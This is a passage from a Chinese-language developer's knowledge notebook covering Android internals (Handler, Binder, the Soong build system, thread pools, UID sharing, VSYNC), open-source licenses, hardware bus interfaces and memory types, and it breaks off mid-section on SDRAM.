1.MessageQueue.addIdleHandler可以用来在线程空闲的时候，完成某些操作，比较适合那种需要在将来执行操作，却又不知道需要指定多少延迟时间的操作。
2.Message.what尽量不要设置成0，因为postRunnable的方式会生成Message.what为0的消息，如果删除了what为0的Message，也会将runnable方式创建的Message删掉。
3.Handler可以设置同步异步（默认是同步的），他们的区别在于异步不会被Barrier阻塞，而同步会被阻塞。
4.Handler的消息分发流程是如果Message的callback不为空，通过callback处理，如果Handler的mCallback不为空，通过mCallback来处理，如果前两个都为空，才调用handleMessage来处理。在DroidPlugin中，便是利用ActivityThread.H的这一特性，拦截了部分消息，实现Activity的插件化。
5.Java层和Native层Looper、MessageQueue的创建时序，Java层Looper—>Java层MessageQueue—>Native层NativeMessageQueue—>Native层Looper。
6.Java层通过Handler去发送消息，而Native层是通过Looper发消息。

Window、View相关：
1.硬件加速在Window级只能开不能关，View级只能关不能开。
2.自android2.3删除MidWindow后，PhoneWindow成了Window的唯一实现类。
3.WMS管理Window的过程中涉及4个Binder，应用进程只有ViewRootImpl.W一个Binder服务端。
4.MotionEvent、KeyEvent、DragEvent等具有相似的链式缓存，类似Message。
5.在View的状态保存、恢复过程中，ActionBar中所有View共享一个SparseArray容器，ContentView中所有View共享一个SparseArray容器。当前获取焦点的View会额外存储。
6.设置ViewTreeObserver的系列监听方法需要确保View在attachToWindow之后，否则可能因为add监听和remove监听不是作用于同一个对象而引起内存泄漏等。

Binder、IPC、进程等相关
1.可以通过文件锁来实现进程间互斥（参考：RePlugin），在处理某些只需要单进程执行的任务时很实用。
2.Binder设计架构中，只有Binder主线程是由本进程主动创建，Binder普通线程都是由Binder驱动根据IPC通信需求被动创建。
3.oneway与非oneway，都需要等待Binder Driver的回应消息（BR_TRANSACTION_COMPLETE），区别在于oneway不用等待BR_REPLY消息。
4.mediaserver和servicemanager的主线程都是binder线程，但system_server的主线程不是Binder线程，system_server主线程的玩法跟应用进程一样。
5.同一个BpBinder可以注册多个死亡回调，但Kernel只允许注册一次死亡通知。
6.应用进程由Zygote进程孵化而来，在它真正成为应用进程之前，系统通过抛异常的方式来清理栈帧，并反射调用ActivityThread的main方法。
7.在Binder通信的过程中，数据是从发起通信进程的用户空间直接写到目标进程内核空间，内核空间的数据释放是由用户空间控制的。
```

## [知识点] 四种主流的IM协议

```text
IMPP    Instant Messageing  And  Presence  Protocol 
PRIM    Presence And  Instant  Messageing Protocol
SIMPLE  SIP  for Instant  Messaging  and  Presence  Leveraging  Extensions
XMPP    Extensible Messaging  And  Presence  Protocol  可扩展消息与存在协议, Google的IM软件GTalk 使用的协议,这是一种公开的协议
```

## [知识点] 开源许可协议

```text
越来越多的开发者与设计者希望将自己的产品开源，以便其他人可以在他们的代码基础上做更多事，开源社区也因此充满生机。在我们 所能想到的应用领域，都有开源软件存在（象 WordPress，Drupal 这些开源CMS）。然而很多人对开源许可并不了解，本文介绍开源领域常用的几种许可协议以及它们之间的区别。

什么是许可协议?
什么是许可，当你为你的产品签发许可，你是在出让自己的权利，不过，你仍然拥有版权和专利（如果申请了的话），许可的目的是，向使用你产品的人提供 一定的 权限。

不管产品是免费向公众分发，还是出售，制定一份许可协议非常有用，否则，对于前者，你相当于放弃了自己所有的权利，任何人都没有义务表明你的原始作 者身 份，对于后者，你将不得不花费比开发更多的精力用来逐个处理用户的授权问题。

而开源许可协议 使这些事情变得简单，开发者很容易向一个项目贡献自己的代码，它还可以保护你原始作者的 身份，使你至少获得认可，开源许可协议还可以阻止其它人将某个产品据为 己有。以下是开源界的 5 大许可协议。


GNU GPL
GNU General Public Licence (GPL) 有可能是开源界最常用的许可模式。GPL 保证了所有开发者的权利，同时为使用者提供了足够的复制，分发，修改的权利：

可自由复制 
你可以将软件复制到你的电脑，你客户的电脑，或者任何地方。复制份数没有任何限制。
可自由分发 
在你的网站提供下载，拷贝到U盘送人，或者将源代码打印出来从窗户扔出去（环保起见，请别这样做）。
可以用来盈利 
你可以在分发软件的时候收费，但你必须在收费前向你的客户提供该软件的 GNU GPL 许可协议，以便让他们知道，他们可以从别的渠道免费得到这份软件，以及你收费的理由。
可自由修改 
如果你想添加或删除某个功能，没问题，如果你想在别的项目中使用部分代码，也没问题，唯一的要求是，使用了这段代码的项目也必须使用 GPL 协议。
需要注意的是，分发的时候，需要明确提供源代码和二进制文件，另外，用于某些程序的某些协议有一些问题和限制，你可以看一下 @PierreJoye 写的 Practical Guide to GPL Compliance 一文。使用 GPL 协议，你必须在源代码代码中包含相应信息，以及协议本身。


GNU LGPL
GNU 还有另外一种协议，叫做 LGPL （Lesser General Public Licence ），它对产品所保留的权利比 GPL 少，总的来说，LGPL 适合那些用于非 GPL 或非开源产品的开源类库或框架。因为 GPL 要求，使用了 GPL 代码的产品必须也使用 GPL 协议，开发者不允许将 GPL 代码用于商业产品。LGPL 绕过了这一限制。

BSD
BSD 在软件分发方面的限制比别的开源协议（如 GNU GPL）要少。该协议有多种版本，最主要的版本有两个，新 BSD 协议与简单 BSD 协议，这两种协议经过修正，都和 GPL 兼容，并为开源组织所认可。

新 BSD 协议（3条款协议）在软件分发方面，除需要包含一份版权提示和免责声明之外，没有任何限制。另外，该协议还禁止拿开发者的名义为衍生产品背书，但简单 BSD 协议删除了这一条款。

MIT
MIT 协议可能是几大开源协议中最宽松的一个，核心条款是：

该软件及其相关文档对所有人免费，可以任意处置，包括使用，复制，修改，合并，发表，分发，再授权，或者销售。唯一的限制是，软件中必须包含上述版权和许可提示。

这意味着：
你可以自由使用，复制，修改，可以用于自己的项目。
可以免费分发或用来盈利。
唯一的限制是必须包含许可声明。
MIT 协议是所有开源许可中最宽松的一个，除了必须包含许可声明外，再无任何限制。

Apache
Apache 协议 2.0 和别的开源协议相比，除了为用户提供版权许可之外，还有专利许可，对于那些涉及专利内容的开发者而言，该协议最适合（这里有一篇文章阐述这个问题 ）。

Apache 协议还有以下需要说明的地方:

永久权利 
一旦被授权，永久拥有。
全球范围的权利 
在一个国家获得授权，适用于所有国家。假如你在美国，许可是从印度授权的，也没有问题。
授权免费，且无版税 
前期，后期均无任何费用。
授权无排他性 
任何人都可以获得授权
授权不可撤消 
一旦获得授权，没有任何人可以取消。比如，你基于该产品代码开发了衍生产品，你不用担心会在某一天被禁止使用该代码。
分发代码方面包含一些要求，主要是，要在声明中对参与开发的人给予认可并包含一份许可协议原文。

Creative Commons
Creative Commons (CC) 并非严格意义上的开源许可，它主要用于设计。Creative Commons 有多种协议，每种都提供了相应授权模式，CC 协议主要包含 4 种基本形式：

署名权 
必须为原始作者署名，然后才可以修改，分发，复制。
保持一致 
作品同样可以在 CC 协议基础上修改，分发，复制。
非商业 
作品可以被修改，分发，复制，但不能用于商业用途。但商业的定义有些模糊，比如，有的人认为非商业用途指的是不能销售，有的认为是甚至不能放在有广告的网 站，也有人认为非商业的意思是非盈利。
不能衍生新作品 
你可以复制，分发，但不能修改，也不能以此为基础创作自己的作品。
这些许可形式可以结合起来用，其中最严厉的组合是“署名，非商用，不能衍生新作品”，意味着，你可以分享作品，但不能改动或以此盈利，而且必须为原 作者署名。在这种许可模式下，原始作者对作品还拥有完全的控制权，而最宽松的组合是“署名”，意味着，只要为原始作者署名了，就可以自由处置。
延伸资源

Creative Commons Licenses 
Creative Common 许可的官方条款与解释
Open Source Initiative 
包含各种开源协议资源
Open Source Licenses Comparison 
对主流开源协议的对比
Understanding Open-Source Licensing 
开源协议详解
HOW TO: Pick an Open Source License 
如何选择不同的开源协议
```

## [知识点]  [make] Android 10 Build系统soong+ninja+android.bp

```text
https://blog.csdn.net/Innost/article/details/103286516

Android 10 Build系统简介

Android 10的Build系统是有名字的，它叫Soong。Soong之前，Android的编译系统也有名字，不过比较土，就叫Make——意思是基于Makefile文件的编译系统。Soong其实也不是陌生人，大概在Android 7就崭露头角了。

Soong的宏伟目标是干掉Make。但直到Android 10，这个看起来比较容易的小目标也还未完全实现。为什么呢?

写Makefile文件的语言属于Domain Specific 的Languange（领域语言），它是图灵完备的。所以，Makefile可以写得巨复杂。

AOSP本身是一个非常庞大和复杂的系统。这就导致AOSP里有着成千上万的Makefile文件。各种依赖，组合等等。

OMG...所以，Soong想把Make很快的干掉也不是一件容易的事情。

先看Android 10源码中的build目录，现在是这个样子：

其中有两个比较重要的内容需要了解：

原来的make那套东西，放在make目录下。为了对使用者屏蔽切换编译系统的差异，envsetup.sh等依然还在。

增加了blueprint、kati和soong三个目录。这三位（还得加上一个ninja）一起组成了AOSP的新的Soong编译系统。下图是Soong编译系统中的几位重要成员。

对Android系统的使用者来说：

使用方法和以前一样。先引入build/envsetup,sh，然后执行m/mm/mmm等命令。只不过现在的m/mm/mmm命令将调用Soong中的对应工具。

Soong将把.bp文件交给blueprint工具集来处理。blueprint工具集是用go语言写的。官方文档对它的描述是：a meta-build system。输入为.bp文件。输出为.ninja文件

Soong把.mk/Makefile文件交给kati/ckati工具来处理。kati是go语言写的，而ckati是c++写的。kati官方文档对它的描述是：kati is an experimental GNU make clone。也就是说，kati是对等make命令的。只不过kati并不执行具体的编译工作，而是生成ninja文件。

ninja是一个神奇的东西，它是忍者桃太郎的意思。ninja本身不是编译器，它是去调用具体编译器的工具。真正的编译工作还是由编译器来完成，比如gcc，clang，java等。ninja读取的是.ninja结尾的编译配置文件，然后调起对应的编译器。

好了，上面是整个Soong编译系统的Big picture。现在我们需要对其中一些小问题做一些了解。

ninja是什么

ninja是忍者桃太郎。它最初来自谷歌chrome团队。因为工程师发现原来使用的make系统比较慢。所以考虑要优化优化。题外话，我对谷歌这个工程师文化还是蛮敬佩的，很难想象国内哪个公司还能允许一个团队去优化一个运行得好好的编译系统，而且当时肯定不知道最终能优化成什么样.....

Anyway，ninja的思想还是极具远见的。Makefile文件中如果写了太多if/else，这个管理起来（包含修改）的复杂度就大幅提升。我其实在自己工作中也发现了这个问题。比如，现在Android APP编译的gradle文件也比较复杂了。因为不同渠道，debug/release的原因，if/else这样的代码语句也出现在了gradle文件里。我曾经考虑过能不能有个更高层级的工具，它能生成专门用于比如debug版本的gradle文件。这样，在debug版本里的gradle文件就不需要if/else来区分了。

没想到我的这个想法和ninja的思路是一致的。总结来说，ninja的输入文件(.ninja)是没有if/else这样的分支逻辑。它包含的就是单纯的编译规则。至于debug/release这样的区分，则由更高层级的工具来编写，比如用调试更为方便的python、go等语言编写。

所以，.ninja文件号称编译系统里的汇编文件，既然是汇编文件，自然也不希望你去修改.ninja文件，而是拜托大家去调整生成.ninja文件的地方。比如上图中的blueprint或者kati。所以，ninja是一个比较底层的东西，应该把它嵌入到一个大的编译系统中去。然后由更高层次的工具生成ninja文件并交给ninja去处理。这就是ninja的逻辑。其官网地址是：https://ninja-build.org

.bp和blueprint是什么

Soong系统使用.bp作为编译配置文件，替代了之前的Makefile文件。相比复杂的Makefile，.bp是一个类似json一样的文件。bp就是blueprint的缩写，待会我们会介绍blueprint。

首先，.bp从样子上看就清爽很多，连gradle都不能与之相比。下面是某个bp文件的样子。

.bp文件的内容很明显是借鉴了Google内部的Bazel编译系统。不过，Android中的.bp没有完全照搬bazel，而是省略了对分支逻辑的支持。

另外，bp写起来是比较简单，但是由于正式的文档很稀少，要写对了也不是一件容易的事情。比如，上面的tidy_checks什么意思?可以取哪些值?人民群众急需一个正式而严密的文档！！！。

Android中的.bp文件由谁处理呢?答案是blueprint。blueprint读取.bp然后转成.ninja文件。blueprint本身是一个比较复杂的工具，它是由go语言写的。这里不打算介绍太多，牢记我们的目标是“了解一下”，其官网地址是https://github.com/google/blueprint

kati/ckati是什么

Android 10还未将所有.mk文件转成.bp文件。所以，还需要一个工具用于将.mk/Makefile文件转换成.ninja。这就冒出来了新的工具kati。kati的文档较少。要了解它的话，源码中build/kati下的README.md和INTERNALS.md是最好的材料，尤其是INTERNALS.md，更是无情得打了go的一点点脸

根据上面的文档，kati才是肩负干掉make系统重任的家伙。只不过现在变成soong了，那么kati就降格为将Makefile文件转成.ninja的工具。正是在kati的文档里，我才意识到Make是一个多么复杂的东西。

kati最开始用go写，然后发现速度不行，最后改为C++。所以有两个版本，kati和ckati。为何go版本的kati速度不行呢?作者说，主要是GC慢了。AOSP编译系统大概包含了100万个变量并且不会释放.......。

当然，打脸的事情一定是无图无真相：

m命令的执行

当我们source build/envsetup.sh后，就可以通过m、mm或mmm来编译系统或者某个模块了。这个用法倒是和以前一样，只不过内部实现切换到了soong。这里简单看看envsetup.sh里是怎么和soong勾搭上的。主要了解下m命令即可，来看下图。

m是envsetup.sh里定义的一个函数，它将执行脚本build/soong/soong_ui.bash。而这个soong_ui.bash的核心就是下面这个图：

最后执行的是soong_ui命令。而这个soong_ui的源码位于build/soong/cmd/soong_ui/main.go中。

另外，

以前编译系统的时候需要执行lunch。现在其实不需要lunch了。只要使用m PRODUCT-aosp_x86_64-eng就可以编译aosp_x86_64-eng这个设备的eng系统。

以前要编译某个模块，比如make libart。现在只需要使用m libart即可。好像是方便一点了。

小提示，大家不妨用vscode，配置好go环境，然后调试下这个main.go，切身体验下soong......

其他的内容

envsetup.sh提供了更多的命令，hmm执行下即可获取全部信息。如下图：
比如，
allmod可以获得编译目标下的所有模块
比如，pathmod libart将获取libart所在的源码目录。答案是art/runtime。
allmod、pathmod等命令其实是解析了out/module-info.json这个文件——通过调用python的相关工具。从这一点可以看出，AOSP编译系统其实俨然是一个各种综合技术高度聚集的地方，绝非以前写写Makefile就行。
另外，AOSP 10中有很多编译的小秘密隐藏在一些偷偷生成的文件里，比如下图out/.module_paths目录：
编译中遇到的所有mk文件、bp文件信息等都存到对应的.list里。当然，除了这个.moduel_paths之外，还有更多的秘密等待大家去发现。
后续的安排
AOSP 10源码撸了大概五天，发现其中有一些需要了解的知识，比如APEX、ART等。接下来会对这些东西做一系列的“了解”。在此也欢迎大家提供一些目标，好让我们的"了解Android 10”系列飞得更远一点。
```

## [知识点] Android 四种线程池

```text
https://blog.csdn.net/qq_17250009/article/details/50906508

为什么要使用线程池
当同时并发多个网络线程时，引入线程池技术会极大地提高APP的性能。
显著减少了创建线程的数目。
防止内存过度消耗。控制活动线程的数量，防止并发线程过多。
使用条件：假设在一台APP完成一项任务的时间为T
T1 创建线程的时间
T2 在线程中执行任务的时间，包括线程间同步所需时间
T3 线程销毁的时间
显然T ＝ T1＋T2＋T3。注意这是一个极度简化的假设。可以看出T1,T3是多线程本身的带来的开销，我们渴望减少T1,T3所用的时间，从而减少T的时间。但一些线程的使用者并没有注意到这一点，所以在程序中频繁的创建或销毁线程，这导致T1和T3在T中占有相当比例。显然这是突出了线程的弱点（T1，T3），而不是优点（并发性）。

线程池技术正是关注如何缩短或调整T1,T3时间的技术，从而提高APP程序性能的。它把T1，T3分别安排在服务器程序的启动和结束的时间段或者一些空闲的时间段，这样在服务器程序处理客户请求时，不会有T1，T3的开销了。

四种线程池各自的特点
newCachedThreadPool()
缓存型池子，先查看池中有没有以前建立的线程，如果有，就reuse.如果没有，就建一个新的线程加入池中。能reuse的线程，必须是timeout IDLE内的池中线程，缺省timeout是60s,超过这个IDLE时长，线程实例将被终止及移出池。缓存型池子通常用于执行一些生存期很短的异步型任务 。
newFixedThreadPool()
fixedThreadPool与cacheThreadPool差不多，也是能reuse就用，但不能随时建新的线程 其独特之处:任意时间点，最多只能有固定数目的活动线程存在，此时如果有新的线程要建立，只能放在另外的队列中等待，直到当前的线程中某个线程终止直接被移出池子。和cacheThreadPool不同：fixedThreadPool池线程数固定，但是0秒IDLE（无IDLE）。这也就意味着创建的线程会一直存在。所以fixedThreadPool多数针对一些很稳定很固定的正规并发线程，多用于服务器。
newScheduledThreadPool()
调度型线程池。这个池子里的线程可以按schedule依次delay执行，或周期执行 。0秒IDLE（无IDLE）。
SingleThreadExecutor
单例线程，任意时间池中只能有一个线程 。用的是和cache池和fixed池相同的底层池，但线程数目是1-1,0秒IDLE（无IDLE）。
```

## [知识点] Android应用的UID和PID，TODO : GID？

```text
PID和UID存在的意义
Pid是进程ID，Uid是用户ID，只是Android和计算机不一样，计算机每个用户都具有一个Uid，哪个用户start的程序，这个程序的Uid就是那个用户，而Android中每个程序都有一个Uid，默认情况下，Android会给每个程序分配一个普通级别互不相同的 Uid，如果应用之间要互相调用，只能是Uid相同才行，这就使得共享数据具有了一定安全性，每个软件之间是不能随意获得数据的。而同一个application 只有一个Uid，所以application下的Activity之间不存在访问权限的问题。

uid共享数据实例
假设我们有这样一个需求，A和B是两个应用，现在要求在A中获取B的一张名字为icon_home的图片资源（以Drawable实例的形式呈现），那我们可以考虑将A和B的注册文件的manifest节点添加sharedUserId，并且赋值相同，然后在A中可以用如下方式实现：

Context subContext = null;
try {
    //首先根据B应用的包名获取其上下文，注意这个方法是Context的，如果没找到会抛出异常
    subContext = createPackageContext("com.geo.plugin", Context.CONTEXT_IGNORE_SECURITY);
} catch (NameNotFoundException e) {
    e.printStackTrace();
}
//然后根据上下文获取资源
Resources res = subContext.getResources();
//然后根据图片的名字获取其id
int menuIconId = res.getIdentifier("icon_home", "drawable", "com.geo.plugin");
//最后根据id生产Drawable实例
Drawable drawable = res.getDrawable(menuIconId);
最后需要注意的是，一个应用只有一个uid，但是可以有多个pid（通过process属性来指定进程）。
```

## [知识点] Android persistent 属性

```text
如何保证应用的持久性(persistent)
我们知道，persistent一词的意思是“持久”，那么persistent应用的意思又是什么呢?简单地说，这种应用会顽固地运行于系统之中，从系统一启动，一直到系统关机。

为了保证这种持久性，persistent应用必须能够在异常出现时，自动重新启动。在Android里是这样实现的。每个ActivityThread中会有一个专门和AMS通信的binder实体——final ApplicationThread mAppThread。这个实体在AMS中对应的代理接口为IApplicationThread。

当AMS执行到attachApplicationLocked()时，会针对目标用户进程的IApplicationThread接口，注册一个binder讣告监听器，一旦日后用户进程意外挂掉，AMS就能在第一时间感知到，并采取相应的措施。如果AMS发现意外挂掉的应用是persistent的，它会尝试重新启动这个应用。

https://blog.csdn.net/zhangbijun1230/article/details/80587004

通过官方注释我知道该属性用于是否让你的应用一直处于运行状态（通常说的常驻内存）。设置该属性为true的app具有如下特点：
在系统启动的时候会被系统启动起来，在该app被强制杀掉后系统会重新启动该app，这种情况只针对系统内置app，第三方安装的app不会被重启
```

## [知识点] Resterization 栅格化

```text
Resterization 栅格化是绘制那些 Button、Shape、Path、String、Bitmap 等组件最基础的操作。它把那些组件拆分到不同的像素上进行显示。

这是一个很费时的操作，GPU 的引入就是为了加快栅格化的操作。

CPU 负责把 UI 组件计算成 Polygons，Texture 纹理，然后交给 GPU 进行栅格化渲染。
```

## [知识点] 垂直同步

```text
因为 GPU 的生成图像的频率与显示器的刷新频率是相互独立的，所以就涉及到了一个配合的问题。

最理想的情况是两者之间的频率是相同且协同进行工作的，在这样的理想条件下，达到了最优解。

但实际中 GPU 的生成图像的频率是变化的，如果没有有效的技术手段进行保证，两者之间很容易出现这样的情况。

当 GPU 还在渲染下一帧图像时，显示器却已经开始进行绘制，这样就会导致屏幕撕裂（Tear）。这会使得屏幕的一部分显示的是前一帧的内容，而另一部分却在显示下一帧的内容。

屏幕撕裂（Tear）的问题，早在 PC 游戏时代就被发现， 并不停的在尝试进行解决。 其中最知名可能也是最古老的解决方案就是 VSYNC 技术。

VSYNC 的原理简单而直观：产生屏幕撕裂的原因是 GPU 在屏幕刷新时进行了渲染，而 VSYNC 通过同步渲染/刷新时间的方式来解决这个问题。

显示器的刷新频率为 60Hz，若此时开启 VSYNC，将控制 GPU 渲染速度在 60Hz 以内以匹配显示器刷新频率。这也意味着，在 VSYNC 的限制下，GPU 显示性能的极限就限制为 60Hz 以内。这样就能很好的避免图像撕裂的问题。

通常来说，帧率超过刷新频率只是一种理想的状况，在超过 60fps 的情况下，GPU 所产生的帧数据会因为等待 VSYNC 的刷新信息而被 Hold 住，这样能够保持每次刷新都有实际的新的数据可以显示。但是我们遇到更多的情况是帧率小于刷新频率。
```

## [知识点] Android-findViewById 方法签名变更

```text
findViewById() 签名变更
现在，findViewById() 函数的全部实例均返回 <T extends View> T，而不是 View。此变更会带来以下影响：

例如，如果 someMethod(View) 和 someMethod(TextView) 均接受调用 findViewById() 的结果，这可能导致现有代码的返回类型不确定。
在使用 Java 8 源语言时，这需要在返回类型不受限制时（例如，assertNotNull(findViewById(...)).someViewMethod())）显式转换为 View。
重写非最终的 findViewById() 函数（例如，Activity.findViewById()）将需要更新其返回类型
```

## [知识点] I2S，PCM，IOM-2，I2C，SPI，UART，GPIO

```text
https://blog.csdn.net/u010164190/article/details/72961644
概述

I2S，PCM，IOM-2都是数字音频接口，传数据的。

I2C，SPI，UART，GPIO是控制接口，传控制信令的。

I2S
I2S（Inter-IC Sound）集成电路内置音频总线，是飞利浦公司为数字音频设备之间的音频 数据传输而制定的一种总线标准。

I2S至少3根线：

1. 比特时钟线
首先解释一下比特时钟线。比特时钟线上对每个bit有一个脉冲，比特时钟频率是2×采样频率×采样位数，比如，在播放44.1Khz CD的时候，比特时钟频率就是：44.1KHz*16*2 = 1.4112MHz

2. 帧时钟线
切换左右声道的数据，帧时钟的频率等于采样率。LRCK为“1”表示正在传输的是左声道的数据，为“0”则表示正在传输的是右声道的数据。LRCK的频率等于采样频率。 

3. 复用数据线
所谓复用，指的是左右声道的复用。传输数据是以2的补码，大端形式给出。
I2S可能还有一根线，是主时钟线或上行数据线。所以，碰到四线的I2S也不要惊讶哦~~
I2S有主从模式，就是谁来提供时钟的选择。谁提供时钟，谁就是主（Master）

PCM
也是传输数字音频的，一般是固定8k的采样率的单声道音频。

IOM-2
高品质音频，一般传给蓝牙A2DP的是这种接口

I2C(Inter－Integrated Circuit)
两根线，一个CLK线，一根DATA线，有主从模式，一般MCU做主，器件做从。I2C使用两根双向半双工的线，主提供时钟。时钟都是bit时钟，发送请求的时候，比如获取寄存器内容的时候，主发送请求，然后交出DATA线控制权，从回答请求，并返回寄存器内容。

下面就是一主多从的例子：

SPI
Only 2chip select lines so max number ofdevices is very limited. Bus is faster andcan be driven over longer cable runsthan I2C. Programming more difficult.Device selection very limited unless youare willing to solder SMD.

UART
Welcome tothe 1970s! 通用异步串行口。按照标准波特率完成双向通讯，速度慢。UART总线是异步串口，因此一般比前两种同步串口的结构要复杂很多，一般由波特率产生器(产生的波特率等于传输波特率的16倍)、UART接收器、UART发送器组成，硬件上由两根线，一根用于发送，一根用于接收。 UART是用于控制计算机与串行设备的芯片。有一点要注意的是，它提供了RS-232C数据终端设备接口，这样计算机就可以和调制解调器或其它使用RS-232C接口的串行设备通信了。

GPIO
GPIO，通用型输入输出（GeneralPurpose I/O）的简称，其引脚可以供使用者由程式控制自由使用，PIN脚可作为通用输入（GPI）或通用输出（GPO）或通用输入输出（GPIO），如当clk generator, chip select等。

既然一个引脚可以用于输入、输出或其他特殊功能，那么一定有寄存器用来选择这些功能。对于输入，一定可以通过读取某个寄存器来确定引脚电平的高低；对于输出，一定可以通过写入某个寄存器来让这个引脚输出高电平或者低电平；对于其他特殊功能，则有另外的寄存器来控制它们。

SLIMBus 

音频、数据、总线和单条总线上的设备控制器；
减少引脚数以降低产品消耗；
支持高质量音频多信道；
单条总线上多重并发采样率； 
高效、不受主机控制的、对等通用数据通信；
提高软件重用性和协同工作能力的标准消息集；
使用普通数字音频时钟，也同时使用已经建立的系统时钟
为优化总线功率消耗而采用动态时钟频率

这边有个手机上FM+BT芯片接口的例子：蓝牙用的是PCM/I2S传输音频数据，控制信令走UART/I2C，FM音频走模拟电路。
```

## [知识点] Android系统自带AEC/AGC/NC的demo

```text
1.声学回声消除器（AEC）
AcousticEchoCanceler类消除了从远程捕捉到音频信号上的信号的作用,回声消除AcousticEchoCanceler继承自AudioEffect.
2.自动增益控制（AGC）
AutomaticGainControl类自动恢复正常捕获的信号输出
3.噪声抑制器（NC）
NoiseSuppressor类可以消除被捕获信号的背景噪音
```

## TODO : [知识点] 存储器：register，RAM，DRAM，SRAM，ccache，SDRAM，NVRAM，NVM，DDR3，ROM，NAND FLASH，NOR FLASH，MMC，eMMC，固件？

```text
存储器是用来存储程序和数据的部件，对于计算机来说，有了存储器，才有记忆功能，才能保证正常工作。存储器的种类很多，按其用途可分为主存储器和辅助存储器，主存储器又称内存储器（简称内存，港台称之为记忆体）。外储存器是指除计算机内存及CPU缓存以外的储存器，此类储存器一般断电后仍然能保存数据。常见的外存储器有硬盘、软盘、光盘、U盘等。

Register：简单来说，CPU 里面也有一个储存空间，叫做 Register。要运算时、CPU 会从内存中把数据载入Register、再让Register中存的数字做运算，运算完再将结果存回内存中。毕竟 CPU 和内存终究还是两片不同的芯片，没有在同一片芯片里直接抓数据快。

Cache：这是CPU 和内存之间的中间桥梁。

速度来讲，就是：CPU里面的Register > Cache > 内存 > 硬盘。越上层（越靠近 CPU），速度就越快、价格越高、容量越低。

存储器的分类

电的存储器是指电写电读的存储器，主要分为两大类，如图一所示：

易失性存储器（Volatile Memory，VM）：电源开启时资料存在，电源关闭则资料立刻流失（资料挥发掉），例如：SRAM、DRAM、SDRAM、DDR-SDRAM 等。

非易失性存储器（Non-Volatile Memory，NVM）：电源开启时资料存在，电源关闭资料仍然可以保留，例如：ROM、PROM、EPROM、EEPROM、Flash ROM、FRAM、MRAM、RRAM、PCRAM 等。

▲ 图一：存储器的分类。

存储器的单元

存储器的“单元”（Cell）是指用来存取资料的最小结构，如果含有一个晶体管（Transistor）与一个电容（Capacitor）则称为“1T1C”；如果含有一个晶体管（Transistor）与一个电阻（Resistor）则称为“1T1R”；如果含有一个二极体（Diode）与一个电阻（Resistor）则称为“1D1R”。

存储器的每个“单元”不一定只能储存 1 个位的资料，由于我们对存储器容量的要求越来越高，每个“单元”能储存的资料越来越多，依照每个“单元”能储存的资料位数又分为：单层单元（Single-Level Cell，SLC）、多层单元（Multi-Level Cell，MLC）、三层单元（Triple-Level Cell，TLC）、四层单元（Quad-Level Cell，QLC）等。

存储器层次结构（Memory hierarchy）

要了解电子产品的各种存储器配置，就必须先介绍“存储器层次结构”（Memory hierarchy）观念。存储器层次结构是指如何将储存容量不同、运算速度不同、单位价格不同的多种存储器妥善分配，才能达到最大的经济效益，使产品的运算速度合理、储存容量合理、产品价格合理。

图二为存储器阶层示意图，由上而下依序为暂存器、快取存储器、主存储器、辅助存储器：

暂存器（Register，也译为寄存器）：在处理器内，用来设定处理器的功能，主要是“暂时储存”设定值的地方。

快取存储器（Cache memory，翻译版本有缓存，快取缓存区，快取存储器；台湾翻译为快取。）：在处理器内，执行程序时“暂时储存”程序与资料的地方，通常以 SRAM 制作。

主存储器（Main memory）：在处理器外，“暂时储存”程序与资料的地方，通常以 DRAM 制作，目前已经改良成 SDRAM 或 DDR。

辅助存储器（Assistant memory）：在处理器外，“永久储存”程序与资料的地方，包括：快闪存储器、磁盘机、光盘机、磁带机等。

不同种类的存储器分别有不同的储存容量、工作速度、单位价格：

储存容量：辅助存储器（GB）> 主存储器（MB）> 快取存储器（KB）> 暂存器（B）。

工作速度：辅助存储器（1ms）< 主存储器（10ns）< 快取存储器（1ns）< 暂存器（1ns）。

单位价格：辅助存储器 < 主存储器 < 快取存储器 < 暂存器。

▲ 图二：存储器阶层示意图。

存储器的应用

所有的电子产品都必须用到存储器，而且通常用到不只一种存储器，由于存储器的种类繁多，常常让使用者混淆，我们简单说明不同存储器之间的差异，图三为手机主要芯片的系统方块图（System block diagram），包括：应用处理器（Application processor）、基带处理器（Baseband processor）、运动控制器（Motion Controller）。

应用处理器主要是执行操作系统（Operating System，OS）与应用程序（Application program，App），暂存器与快取存储器目前都是内建在处理器内，其中暂存器用来设定处理器的功能，用来设定暂存器数值的程序，也就是用来趋动硬件的软件程序又称为“固件”（Firmware）；快取存储器是在执行程序时用来“暂时储存”程序与资料的地方，由于在处理器内离运算单元比较近，可以缩短程序与资料来回的时间，加快程序的执行速度因此称为“Cache”。

由于快取存储器成本较高因此容量不大，如果执行程序时放不下，则可以退一步放在主存储器内，可是目前主存储器所使用的 SDRAM 或 DDR，属于易失性存储器，电源关闭则资料立刻流失，因此关机后资料必须储存在非易失性的辅助存储器内，早期辅助存储器使用磁盘机、光盘机、磁带机等，由于半导体制程的进步，目前大多使用快闪存储器（Flash ROM），或所谓的固态硬盘（Solid State Disk，SSD），固态硬盘其实也是使快闪存储器制作。

由于快取存储器（SRAM）与主存储器（SDRAM、DDR）是执行程序用来“暂时储存”程序与资料的地方，与处理器内的运算单位直接使用汇流排（Bus）连接，一般都是用“位”（bit）来计算容量；而辅助存储器是“永久储存”程序与资料的地方，由于一个位组（Byte）可以储存一个半型字，因此一般都是用“位组”（Byte）来计算容量。




▲ 图三：手机主要芯片的系统方块图（System block diagram）。

静态随机存取存储器（SRAM：Static RAM）

以 6 个晶体管（MOS）来储存 1 个位（1bit）的资料，而且使用时“不需要”周期性地补充电源来保持记忆的内容，故称为“静态”（Static）。

SRAM 的构造较复杂（6 个晶体管储存 1 个位的资料），不使用电容所以存取速度较快，但是成本也较高，因此一般都制作成对容量要求较低但是对速度要求较高的存储器，例如：中央处理器（CPU）内建 256KB、512KB、1MB 的“快取存储器”（Cache memory），一般都是使用 SRAM。

动态随机存取存储器（DRAM：Dynamic RAM）

以一个晶体管（MOS）加上一个电容（Capacitor）来储存一个位（1bit）的资料，而且使用时“需要”周期性地补充电源来保持记忆的内容，故称为“动态”（Dynamic）。

DRAM 构造较简单（一个晶体管加上一个电容），由于电容充电放电需要较长的时间造成存取速度较慢，但是成本也较低，因此一般制作成对容量要求较高但是对速度要求较低的存储器，例如：个人电脑主机板通常使用 1GB 以上的 DDR-SDRAM 就是属于一种 DRAM。由于处理器的速度越来越快，传统 DRAM 的速度已经无法满足要求，因此目前都改良成 SDRAM 或 DDR-SDRAM 等两种型式来使用。

同步动态随机存取存储器（SDRAM：Synchronous DRAM）

